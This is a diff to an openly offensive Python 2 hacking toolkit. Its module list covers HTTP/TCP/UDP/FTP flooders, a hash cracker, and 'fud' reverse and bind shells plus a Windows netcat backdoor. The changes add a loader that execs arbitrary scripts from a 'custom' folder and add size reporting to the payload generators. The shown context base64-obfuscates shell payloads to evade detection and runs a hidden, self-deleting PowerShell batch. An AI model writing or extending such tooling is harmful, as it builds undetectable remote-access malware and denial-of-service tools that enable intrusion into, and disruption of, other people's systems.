@@ -13,9 +13,10 @@ except ImportError:
 	green=''
 	yellow=''
 	white=''
-scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']} # SCRIPTS
+scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc'],'custom':os.listdir(os.getcwd()+'\\'+'custom')} # SCRIPTS
 opt1 = ''
 opt2 = ''
+
 infos = {'flood/http': # Help for each script
 	'Options:\nurl .... target to attack    '+opt1,'flood/tcp':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
@@ -24,6 +25,11 @@ infos = {'flood/http': # Help for each script
 	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,
 	'flood/ftp':'Options:\nhost .... target to attack	'+opt1+'\nbytes .... bytes lenght to send on each connection	'+opt2
 }
+for s in scs['custom']:
+    infos[s] = 'Options:\nrun .... start script\t'
+def custom(name):
+    	script = open('custom/'+name)
+	exec(script.read())
 def options(script,_opt1,_opt2):
 	global opt1
 	global opt2
@@ -233,6 +239,8 @@ def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 		_file = open(pth, 'w')
 	print '%s[*]%s Enconding' %(blue,white)
 	enc = payload.encode('base64').replace('\n','') # encode as base64
+	size = len(enc)
+	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
 	_file.close()
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
@@ -252,6 +260,8 @@ def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
 		_file = open(pth, 'w')
 	print '%s[*]%s Enconding' %(blue,white)
 	enc = payload.encode('base64')
+	size = len(enc)
+	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
 	_file.close()
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
@@ -267,6 +277,8 @@ echo del bd.bat >> bd.bat
 echo exit >> bd.bat
 powershell -W hidden ./bd.bat
 del bd.bat'''
+	size = len(payload)+61440
+	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
 	if os.path.isdir('output'):
 		pth = 'output/'+pth
 		_file = open(pth, 'w')
@@ -274,7 +286,7 @@ del bd.bat'''
 		_file = open(pth, 'w')
 	_file.write(payload)
 	_file.close()
-	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
+	print '%s[+]%s File saved as: %s' %(green,white,pth)
 def run(script, opt1, opt2):
 	if script == 'flood/http':
 		floodhttp(opt1)
@@ -295,3 +307,5 @@ def run(script, opt1, opt2):
 		fud_bindshell(opt1, opt2)
 	if script == 'windows/nc':
 		windows_nc(opt1, opt2)
+	if opt2 == '__custom__':
+		custom(script)
